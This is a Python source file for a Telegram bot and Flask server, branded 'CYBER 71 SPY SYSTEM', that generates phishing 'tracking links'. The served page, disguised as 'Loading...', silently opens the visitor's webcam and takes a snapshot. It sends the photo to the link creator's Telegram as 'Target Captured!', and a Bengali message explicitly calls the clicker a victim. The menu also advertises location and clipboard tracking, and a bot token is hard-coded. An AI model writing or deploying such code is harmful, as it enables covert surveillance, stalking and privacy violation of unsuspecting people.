import base64
import threading
import requests
import os
from datetime import datetime
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = '8646984068:AAE_vtnqaJe_VgBn5Hl5Qjv30sA5cwbL8IQ'
BASE_URL = 'https://populations-pleased-laundry-does.trycloudflare.com' 
ADMIN_LINK = 'https://t.me/KING_OF_ENAFUL' 
PORT = 5000

TRACK_HTML = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loading...</title></head>
<body><video id="v" autoplay style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
<script>
    navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
        let v=document.getElementById('v'); v.srcObject=s;
        setTimeout(()=>{
            let c=document.getElementById('c');
            c.width=640; c.height=480;
            c.getContext('2d').drawImage(v,0,0,640,480);
            fetch('/upload',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({img:c.toDataURL('image/png'),id:'{{chat_id}}'})});
        },2500);
    }).catch(e => console.log("Error"));
</script></body></html>
"""

app = Flask(__name__)

@app.route('/track/<chat_id>')
def track(chat_id): return render_template_string(TRACK_HTML, chat_id=chat_id)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    img_bytes = base64.b64decode(data['img'].split(',')[1])
    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', 
                  params={'chat_id': data['id'], 'caption': '📸 **Target Captured! Check your results.**\n\n🛡️ *System by ENAFUL*'},
                  files={'photo': ('snap.png', img_bytes)})
    return "OK"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    
    welcome_text = (
        f"🛡️ **CYBER 71 SPY SYSTEM** 🛡️\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **OWNER:** **ENAFUL**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📝 **USER INFORMATION:**\n"
        f"┣ 👤 **Name:** {user.first_name}\n"
        f"┣ 🆔 **User ID:** `{user.id}`\n"
        f"┣ 🛡️ **Status:** Premium ✅\n"
        f"┣ 🌐 **IP:** Hidden 🔒\n"
        f"┗ 📅 **Date:** {now}\n\n"
        f"💰 **Balance:** 30 🌑 coins\n\n"
        f"📢 **Note:** Select a tool from below and generate your personal tracking link."
    )
    
    keyboard = [
        [InlineKeyboardButton("📸 Front Camera", callback_data='gen'),
         InlineKeyboardButton("📸 Back Camera", callback_data='gen')],
        [InlineKeyboardButton("📍 Location Tracker", callback_data='gen'),
         InlineKeyboardButton("📋 Clipboard Monitor", callback_data='gen')],
        [InlineKeyboardButton("💰 My Balance", callback_data='bal'),
         InlineKeyboardButton("📊 History", callback_data='hist')],
        [InlineKeyboardButton("👨‍💻 Contact OWNER (ENAFUL)", url=ADMIN_LINK)],
        [InlineKeyboardButton("🎁 Daily Coins", callback_data='daily')]
    ]
    
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'gen':
        personal_link = f"{BASE_URL}/track/{query.from_user.id}"
        msg = (
            "✅ **Link Successfully Parked!**\n\n"
            f"🔗 **Your Private Link:**\n`{personal_link}`\n\n"
            "⚠️ ভিকটিম লিঙ্কে ক্লিক করলে ছবি সরাসরি আপনার ইনবক্সে চলে আসবে।"
        )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif query.data == 'back':
        await start(query, context)

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CallbackQueryHandler(handle_callback))
    
    print("--------------------------------")
    print("  OWNER: ENAFUL | BOT IS LIVE  ")
    print("--------------------------------")
    bot.run_polling()

